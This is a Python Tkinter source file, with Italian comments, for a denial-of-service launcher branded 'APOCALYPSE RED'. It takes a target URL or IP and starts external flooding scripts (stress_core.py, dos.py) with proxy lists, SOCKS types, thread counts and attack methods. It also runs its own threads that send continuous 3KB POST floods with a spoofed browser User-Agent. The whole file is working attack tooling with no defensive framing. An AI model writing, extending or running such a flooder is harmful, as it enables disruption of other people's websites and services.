import tkinter as tk
from tkinter import messagebox, scrolledtext
from PIL import Image, ImageTk
import subprocess
import threading
import sys
import random
import time
import requests
from urllib.parse import urlparse

# Variabili globali
processes = []
fake_threads = []
attack_active = False

def is_valid_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except:
        return False

def send_3kb_request(target):
    """Invia una richiesta POST con payload di 3KB al target"""
    try:
        payload = b'A' * 3072
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Content-Type': 'application/octet-stream',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive'
        }
        start_time = time.time()
        response = requests.post(target, data=payload, headers=headers, timeout=3)
        elapsed = (time.time() - start_time) * 1000
        return response.status_code, elapsed, len(payload)
    except Exception as e:
        return f"Errore: {str(e)}", 0, 0

def fast_3kb_attack(target, box):
    """Esegue attacchi continui con richieste da 3KB"""
    global attack_active
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    while attack_active:
        try:
            status, elapsed, size = send_3kb_request(target)
            if status == 200:
                box.insert(tk.END, f"[SUCCESS] {target} - 3KB in {elapsed:.1f}ms\n")
            elif isinstance(status, int):
                box.insert(tk.END, f"[STATUS {status}] {target} - 3KB in {elapsed:.1f}ms\n")
            else:
                box.insert(tk.END, f"[ERROR] {status}\n")
            box.see(tk.END)
            time.sleep(random.uniform(0.01, 0.1))
        except Exception as e:
            box.insert(tk.END, f"[FATAL] {str(e)}\n")
            box.see(tk.END)
            time.sleep(1)

def start_test():
    global attack_active
    target = entry_target.get().strip()
    duration = entry_duration.get().strip()
    concurrency = entry_concurrency.get().strip()
    payload = entry_payload.get().strip()

    dos_method = method_var.get()
    custom_args = entry_custom_args.get().strip()

    if not target:
        messagebox.showerror("Errore", "Inserisci un URL o IP valido.")
        return

    if not is_valid_url(target) and not target.replace('.', '').isdigit():
        messagebox.showerror("Errore", "Inserisci un URL valido (es: http://example.com).")
        return

    attack_active = True

    if dos_method == "stress_core.py":
        cmd = [
            sys.executable, "stress_core.py",
            target,
            "-d", duration,
            "-c", concurrency,
            "--payload-size", payload,
            "--log-level", "INFO"
        ]
        if custom_args:
            cmd += custom_args.split()
    elif dos_method == "dos.py":
        # Esempio di argomenti per dos.py:
        # python3 dos.py GET http://example.com 1 1000 http.txt 64 60
        # L7: [python3] dos.py <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration> <debug=optional>
        # Prendiamo i parametri dalla GUI, ma servono dei valori di default “sicuri” per proxylist/rpc/socks_type
        dos_attack_method = entry_dos_method.get().strip().upper()
        socks_type = entry_socks_type.get().strip()
        proxylist = entry_proxylist.get().strip()
        rpc = entry_rpc.get().strip()

        if not dos_attack_method:
            messagebox.showerror("Errore", "Inserisci un metodo dos.py (es: GET, POST, OVH ...)")
            return

        if not socks_type: socks_type = "1"
        if not proxylist: proxylist = "http.txt"
        if not rpc: rpc = "64"

        cmd = [
            sys.executable, "dos.py",
            dos_attack_method,
            target,
            socks_type,
            concurrency,
            proxylist,
            rpc,
            duration
        ]
        if custom_args:
            cmd += custom_args.split()
    else:
        messagebox.showerror("Errore", "Seleziona uno script di attacco.")
        return

    def run():
        try:
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            processes.append(process)

            # Avvia attacchi reali da 3KB
            t2 = threading.Thread(target=lambda: fast_3kb_attack(target, output_box_fake2), daemon=True)
            t3 = threading.Thread(target=lambda: fast_3kb_attack(target, output_box_fake3), daemon=True)
            t2.start()
            t3.start()
            fake_threads.extend([t2, t3])

            for line in iter(process.stdout.readline, ''):
                output_box_main.insert(tk.END, line)
                output_box_main.see(tk.END)
            process.stdout.close()
        except Exception as e:
            output_box_main.insert(tk.END, f"Errore: {e}\n")
            output_box_main.see(tk.END)

    threading.Thread(target=run, daemon=True).start()

def stop_test():
    global attack_active
    attack_active = False

    for p in processes:
        if p.poll() is None:
            p.terminate()

    output_box_main.insert(tk.END, "Test interrotto manualmente.\n")
    output_box_main.see(tk.END)

    output_box_fake2.delete(1.0, tk.END)
    output_box_fake2.insert(tk.END, "DOS Console #2\nAttacco terminato\n")
    output_box_fake3.delete(1.0, tk.END)
    output_box_fake3.insert(tk.END, "DOS Console #3\nAttacco terminato\n")

# GUI setup
root = tk.Tk()
root.title("APOCALYPSE RED")
root.geometry("950x1050")
root.configure(bg="#0d0d0d")

font_label = ("OCR A Extended", 11, "bold")
font_input = ("Consolas", 11)
font_title = ("OCR A Extended", 25, "bold")

tk.Label(root, text="A P O C A L Y P S E", font=font_title, fg="red", bg="#0d0d0d").pack(pady=10)

img = Image.open("skull.jpg").resize((300, 150))
photo = ImageTk.PhotoImage(img)
tk.Label(root, image=photo, bg="#0d0d0d").pack(pady=10)

frame_options = tk.Frame(root, bg="#0d0d0d", highlightbackground="red", highlightthickness=2, padx=10, pady=10)
frame_options.pack(pady=10, fill="x", padx=20)

def add_entry(label_text, default="", width=50):
    tk.Label(frame_options, text=label_text, font=font_label, fg="white", bg="#0d0d0d").pack(anchor="w")
    e = tk.Entry(frame_options, font=font_input, fg="red", bg="black", insertbackground="red", width=width)
    if default:
        e.insert(0, default)
    e.pack(pady=2)
    return e

entry_target = add_entry("Target URL o IP (es: http://example.com):")
entry_duration = add_entry("Durata (s):", "60")
entry_concurrency = add_entry("Concorrenza:", "2000")
entry_payload = add_entry("Payload Size (es: 10KB o 10MB):", "10MB")

# Nuove opzioni per dos.py
tk.Label(frame_options, text="--- OPZIONI dos.py (solo se selezionato sotto) ---", font=font_label, fg="#ff8800", bg="#0d0d0d").pack(anchor="w", pady=(8,0))
entry_dos_method = add_entry("Metodo (es: GET, POST, OVH, STRESS...):", "GET", 20)
entry_socks_type = add_entry("SOCKS Type [0=ALL,1=HTTP,4=SOCKS4,5=SOCKS5,6=RANDOM]:", "1", 8)
entry_proxylist = add_entry("File Proxylist (es: http.txt):", "http.txt", 20)
entry_rpc = add_entry("RPC (request per connessione):", "64", 8)

tk.Label(frame_options, text="Opzioni aggiuntive CLI (facoltative):", font=font_label, fg="#999999", bg="#0d0d0d").pack(anchor="w")
entry_custom_args = tk.Entry(frame_options, font=font_input, fg="red", bg="black", insertbackground="red", width=80)
entry_custom_args.pack(pady=2)

tk.Label(frame_options, text="Seleziona script di attacco:", font=font_label, fg="#ff8800", bg="#0d0d0d").pack(anchor="w")
method_var = tk.StringVar(value="stress_core.py")
tk.Radiobutton(frame_options, text="stress_core.py", variable=method_var, value="stress_core.py", font=font_label, fg="white", bg="#0d0d0d", selectcolor="#cc0000").pack(anchor="w")
tk.Radiobutton(frame_options, text="dos.py", variable=method_var, value="dos.py", font=font_label, fg="white", bg="#0d0d0d", selectcolor="#cc0000").pack(anchor="w")

frame_dos = tk.Frame(root, bg="#0d0d0d")
frame_dos.pack(pady=10)

def create_fake_dos(title):
    box = scrolledtext.ScrolledText(frame_dos, height=10, width=40, bg="black", fg="green", font=("Consolas", 9),
                                    insertbackground="green", highlightbackground="red", highlightthickness=1)
    box.insert(tk.END, f"{title}\nIn attesa di avvio...\n")
    box.pack(side=tk.LEFT, padx=10)
    return box

output_box_main = create_fake_dos("DOS Console #1")
output_box_fake2 = create_fake_dos("DOS Console #2")
output_box_fake3 = create_fake_dos("DOS Console #3")

button_frame = tk.Frame(root, bg="#0d0d0d")
button_frame.pack(pady=20)

def hover(e, color): e.widget.config(bg=color)

btn_start = tk.Button(button_frame, text="START", command=start_test, font=font_label,
                      fg="white", bg="red", width=20, height=2)
btn_start.pack(side=tk.LEFT, padx=20)
btn_start.bind("<Enter>", lambda e: hover(e, "#cc0000"))
btn_start.bind("<Leave>", lambda e: hover(e, "red"))

btn_stop = tk.Button(button_frame, text="STOP", command=stop_test, font=font_label,
                     fg="white", bg="grey", width=20, height=2)
btn_stop.pack(side=tk.LEFT, padx=20)

root.mainloop()
